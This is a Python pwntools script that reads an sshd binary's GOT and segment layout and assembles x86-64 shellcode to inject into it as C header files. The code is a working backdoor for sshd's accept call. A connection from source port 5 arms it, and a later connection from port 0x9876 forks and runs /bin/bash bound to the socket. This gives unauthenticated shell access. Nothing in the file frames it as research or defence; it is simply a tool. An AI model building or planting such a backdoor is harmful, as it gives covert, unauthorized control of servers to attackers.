from pwn import *
elf_name = './sshd'
context.arch = 'amd64'
sshd = ELF(elf_name)

def get_got_offset (func: str) -> int:
    return sshd.got[func]

def get_seg_gap(flag: int) -> int:
    mem_len = 0

    for segment in sshd.iter_segments():
        if segment['p_type'] == 'PT_LOAD':
            if (segment['p_flags'] == flag):
                mem_len = segment['p_memsz']
                return mem_len + segment['p_vaddr']

    print ('elf parse error')
    exit (1)

accept_offset = get_got_offset ('accept')
__errno_location_offset = get_got_offset ('__errno_location')

with open ('./include/got_offset.h', 'w') as f:
    f.write('#ifndef GOT_OFFSET\n')
    f.write('#define GOT_OFFSET\n\n')
    f.write('#include <stdint.h>\n')
    f.write('uint64_t accept_offset = ' + str(hex(accept_offset)) + ';\n')
    f.write('uint64_t __errno_location_offset = ' + str(hex(__errno_location_offset)) + ';\n')
    f.write('#endif\n')

rw_gap = (get_seg_gap(6) & ~0x7) + 0x8
rx_gap = (get_seg_gap(5) & ~0x7) + 0x8

with open('./include/seg_gaps.h', 'w') as f:
    f.write('#ifndef SEG_GAPS\n')
    f.write('#define SEG_GAPS\n\n')
    f.write('#include <stdint.h>\n')
    f.write('uint64_t rx_gap_start = ' + str(hex(rx_gap)) + ';\n')
    f.write('uint64_t rw_gap_start = ' + str(hex(rw_gap)) + ';\n\n')
    f.write('#endif')

text = (
f"""
push 0x2b
pop rax
syscall

push rdi
push rsi
push rdx
push rcx
push r10
push r8
push r9
push rax

lea rdi, [rip+{rw_gap - rx_gap - 0x17}]
mov rax, [rsi+2]
"""
# get connection port

f"""
cmp ax, 0x0500
je set_backdoor_open
"""
# port 5 means open backdoor

f"""
cmp ax, 0x7698
jne close_backdoor
"""
# port 0x9876 means log in with backdoor
# also it will close the backdoor

f"""
is_backdoor_open:
mov rax, [rdi]
cmp al, 0x1
jne close_backdoor
"""
# return backdoor is closed

f"""
backdoor:
mov rax, 0x39
syscall
"""
# fork

f"""
cmp al, 0x0
jne act_if_accept_failed
"""
# father should return with error

f"""
pop rdi
push 0x21
pop rax
push 0x0
pop rsi
syscall

push 0x21
pop rax
push 0x1
pop rsi
syscall

push 0x21
pop rax
push 0x2
pop rsi
syscall

push 0x68
mov rax, 0x7361622f6e69622f
push rax
push rsp
pop rdi

push 0x68736162
push rsp
pop rsi
push 0x0
push rsi
push rsp
pop rsi

xor edx, edx
push 0x3b
pop rax
syscall
"""
# execve

f"""
set_backdoor_open:
mov byte ptr [rdi], 0x1
jmp return
"""
# set backdoor open

f"""
act_if_accept_failed:
pop rax
mov rax, -1
push rax
call [rip + {__errno_location_offset - rx_gap - 0x8a}]
mov dword ptr [rax], 4
"""
# set errno 4, set return value -1

f"""
close_backdoor:
mov byte ptr [rdi], 0x0
"""
# close backdoor

f"""
return:

pop rax
pop r9
pop r8
pop r10
pop rcx
pop rdx
pop rsi
pop rdi
ret

nop
nop
nop
nop
nop
nop
nop
"""
)

# print(text)
raw_asm = asm (text)
c_code = ''.join(f'\\x{b:02x}' for b in raw_asm)

with open ('./include/inject_code.h', 'w') as f:
    f.write('#ifndef INJECT_COED\n')
    f.write('#define INJECT_COED\n\n')
    f.write('char inject_code[] = "' + c_code + '";\n\n')
    f.write('#endif')

print ('\nrw_gap_start at: ' + str (hex(rw_gap)))
print ('rx_gap_start at: ' + str (hex(rx_gap)))
print ('accept_offset at: ' + str(hex(accept_offset)))
print ('__errno_location_offset at: ' + str(hex(__errno_location_offset)))
print('asm success\n')

